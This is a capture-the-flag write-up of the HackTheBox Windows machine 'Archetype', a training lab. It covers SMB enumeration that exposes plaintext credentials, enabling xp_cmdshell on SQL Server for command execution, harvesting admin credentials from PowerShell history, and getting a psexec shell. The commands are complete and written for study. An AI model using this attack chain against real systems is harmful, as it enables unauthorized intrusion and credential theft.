# Archetype

**Platform:** HackTheBox  
**OS:** Windows  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Windows machine exposing SMB and Microsoft SQL Server.
Credentials found in an SMB share lead to SQL Server access,
which allows OS command execution. Privilege escalation achieved
via credentials stored in PowerShell history.

---

## 1. Reconnaissance

Port scan using nmap:
```bash
nmap -sCV -p- -A 10.129.17.233
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 135 | MSRPC | Windows RPC |
| 139/445 | SMB | Windows Server 2019 |
| 1433 | MSSQL | SQL Server 2017 |

---

## 2. SMB Enumeration

Listed available shares without credentials:
```bash
smbclient -N -L 10.129.17.233
```

Found a non-administrative share: **backups**
```bash
smbclient //10.129.17.233/backups -N
get prod.dtsConfig
```

The configuration file contained plaintext credentials 
for the SQL Server.

---

## 3. SQL Server Access

Connected using Impacket's mssqlclient:
```bash
mssqlclient.py user:password@10.129.17.233 -windows-auth
```

Enabled OS command execution:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- Output: archetype\sql_svc
```

---

## 4. Privilege Escalation

Checked current privileges:
```sql
EXEC xp_cmdshell 'whoami /priv';
```

`SeImpersonatePrivilege` was enabled.

Ran **winPEAS** for further enumeration. Found administrator
credentials in PowerShell history file:
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows
PowerShell\PSReadLine\ConsoleHost_history.txt

Used discovered credentials with Impacket's psexec:
```bash
psexec.py administrator@10.129.17.233
```

Navigated to `C:\Users\Administrator\Desktop` and retrieved 
root flag.

---

## 5. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| smbclient | SMB share enumeration |
| mssqlclient.py | SQL Server authentication |
| winPEAS | Privilege escalation enumeration |
| psexec.py | Remote shell as Administrator |
